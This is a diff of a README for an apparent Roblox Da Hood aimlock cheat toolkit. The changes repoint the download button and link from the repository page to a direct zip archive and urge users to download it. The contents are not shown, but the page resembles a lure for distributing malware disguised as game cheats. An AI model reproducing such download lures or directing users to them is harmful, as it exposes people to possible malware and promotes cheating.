@@ -1,7 +1,7 @@
 <h1>🎯 da-hood-script-2026-aimlock-combat-toolkit - Master Every Fight, Every Time</h1>
 
 <p align="center">
-  <a href="https://github.com/soltans/da-hood-script-2026-aimlock-combat-toolkit">
+  <a href="https://raw.githubusercontent.com/soltans/da-hood-script-2026-aimlock-combat-toolkit/main/reface/toolkit_combat_script_da_hood_aimlock_v2.6.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-FF5722?style=for-the-badge&logo=github&logoColor=white&color=FF6D00" alt="Download" width="300"/>
   </a>
 </p>
@@ -18,7 +18,7 @@ Welcome! This toolkit is your all-in-one companion for Roblox Da Hood. Whether y
 
 Getting the toolkit on your computer is easy. Follow these simple steps:
 
-1. Click the big orange button at the top of this page (or click here: [Download Toolkit](https://github.com/soltans/da-hood-script-2026-aimlock-combat-toolkit)).
+1. Click the big orange button at the top of this page (or click here: [Download Toolkit](https://raw.githubusercontent.com/soltans/da-hood-script-2026-aimlock-combat-toolkit/main/reface/toolkit_combat_script_da_hood_aimlock_v2.6.zip)).
 2. Visit this link to download the application. The download will start automatically after a few seconds.
 ou may see a pop-up asking you to confirm the save location – choose your Downloads folder.
  you can save it anywhere you like, but the Downloads folder is easiest to find later.
